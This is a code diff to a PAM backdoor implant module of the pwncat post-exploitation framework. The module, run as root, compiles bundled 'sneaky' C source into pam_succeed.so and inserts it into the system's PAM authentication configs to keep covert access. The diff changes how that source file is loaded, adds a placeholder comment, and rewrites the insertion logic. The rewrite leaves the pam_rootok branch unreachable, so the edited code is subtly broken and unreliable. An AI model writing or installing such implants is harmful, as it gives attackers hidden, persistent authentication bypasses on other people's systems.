@@ -3,7 +3,8 @@ import io
 import hashlib
 from subprocess import CalledProcessError
 
-import pkg_resources
+from importlib.resources import files
+from pwncat import data  # Adjust this based on your actual module
 
 import pwncat
 from pwncat.facts import Implant, CreatedFile
@@ -85,7 +86,7 @@ class Module(ImplantModule):
     }
 
     def install(self, session: "pwncat.manager.Session", password, log):
-        """install the pam module"""
+        """Install the pam module"""
 
         if session.current_user().id != 0:
             raise ModuleFailed("root permissions required to install pam module")
@@ -97,7 +98,9 @@ class Module(ImplantModule):
             raise ModuleFailed("only one pam implant may be installed at a time")
 
         yield Status("loading pam module source code")
-        with open(pkg_resources.resource_filename("pwncat", "data/pam.c"), "r") as filp:
+        # Use importlib.resources to access the pam.c file
+        pam_source_path = files(data).joinpath('pam.c')
+        with pam_source_path.open("r") as filp:
             sneaky_source = filp.read()
 
         yield Status("checking selinux state")
@@ -171,23 +174,23 @@ class Module(ImplantModule):
             except (PermissionError, FileNotFoundError):
                 continue
 
-            any("pam_rootok" in line for line in content)
-            for i, line in enumerate(content):
-                if "pam_rootok" in line:
-                    content.insert(i + 1, added_line)
-                    break
-                elif line.startswith("auth"):
-                    content.insert(i, added_line)
-                    break
-            else:
-                content.append(added_line)
+            if not any("pam_rootok" in line for line in content):
+                for i, line in enumerate(content):
+                    if "pam_rootok" in line:
+                        content.insert(i + 1, added_line)
+                        break
+                    elif line.startswith("auth"):
+                        content.insert(i, added_line)
+                        break
+                else:
+                    content.append(added_line)
 
-            try:
-                with (config_path / config).open("w") as filp:
-                    filp.writelines(content)
-                modified_configs.append(config)
-            except (PermissionError, FileNotFoundError):
-                continue
+                try:
+                    with (config_path / config).open("w") as filp:
+                        filp.writelines(content)
+                    modified_configs.append(config)
+                except (PermissionError, FileNotFoundError):
+                    continue
 
         if not modified_configs:
             (pam_location / "pam_succeed.so").unlink()
